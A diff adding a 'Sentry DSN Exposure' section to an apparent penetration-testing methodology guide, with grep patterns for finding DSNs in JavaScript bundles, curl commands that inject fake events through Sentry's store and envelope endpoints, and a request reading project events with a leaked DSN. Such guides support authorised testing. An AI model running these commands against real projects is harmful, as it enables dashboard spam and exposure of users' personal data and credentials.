@@ -119,6 +119,72 @@ secretKey: "xxxxxxxx"
 
 Check: `*.js`, bundles, configuration files.
 
+### Sentry DSN Exposure
+
+Sentry DSN (Data Source Name) is exposed in JS bundles, mobile apps, and config files. An exposed DSN enables:
+1. **Event injection** — Create fake errors, spam the dashboard
+2. **Data exfiltration** — Read project events, breadcrumbs, user PII from Sentry UI
+3. **Internal info disclosure** — Stack traces, env variables, request details
+
+**Find the DSN:**
+```bash
+# In JavaScript bundles
+grep -r "sentry" *.js | grep -E "https://[a-f0-9]+@"
+grep -rE "dsn.*https://[a-f0-9]{32}@" *.js
+
+# Format: https://{PUBLIC_KEY}@{HOST}/{PROJECT_ID}
+# Example: https://abc123def456@o123456.ingest.sentry.io/789012
+
+# Common variable names
+SENTRY_DSN, NEXT_PUBLIC_SENTRY_DSN, VITE_SENTRY_DSN, REACT_APP_SENTRY_DSN
+```
+
+**Validate the DSN:**
+```bash
+DSN="https://abc123@o123456.ingest.sentry.io/789012"
+
+# Send a test event
+curl -X POST "$DSN/api/789012/store/" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "event_id": "deadbeefdeadbeefdeadbeefdeadbeef",
+    "timestamp": "2026-02-19T00:00:00",
+    "message": "test event",
+    "level": "error",
+    "platform": "javascript"
+  }'
+```
+
+**Via envelope endpoint (newer Sentry):**
+```bash
+# Extract from DSN: key, host, project_id
+KEY="abc123"
+HOST="o123456.ingest.sentry.io"
+PROJECT="789012"
+
+curl -X POST "https://$HOST/api/$PROJECT/envelope/" \
+  -H "X-Sentry-Auth: Sentry sentry_version=7, sentry_client=test, sentry_key=$KEY" \
+  -H "Content-Type: application/x-sentry-envelope" \
+  --data-binary $'{"event_id":"deadbeefdeadbeefdeadbeefdeadbeef","sent_at":"2026-02-19T00:00:00.000Z"}\n{"type":"event"}\n{"message":"PoC","level":"error","platform":"javascript"}'
+```
+
+**Escalation: Read events (if DSN grants access):**
+```bash
+# Some DSNs allow reading project events via Sentry API
+# Requires DSN public key in Authorization header
+curl -H "Authorization: DSN $DSN" \
+  "https://sentry.io/api/0/projects/org/project/events/"
+```
+
+**Impact assessment:**
+| Access Level | What You Can Do |
+|-------------|-----------------|
+| Write-only DSN | Inject events, spam dashboard |
+| Read+Write DSN | Read all errors, user data, stack traces |
+| Admin DSN | Read + potentially exfil API tokens from env vars |
+
+**Severity:** HIGH — PII in stack traces, potential credential exposure in breadcrumbs.
+
 ### CORS Misconfigurations
 
 ```http
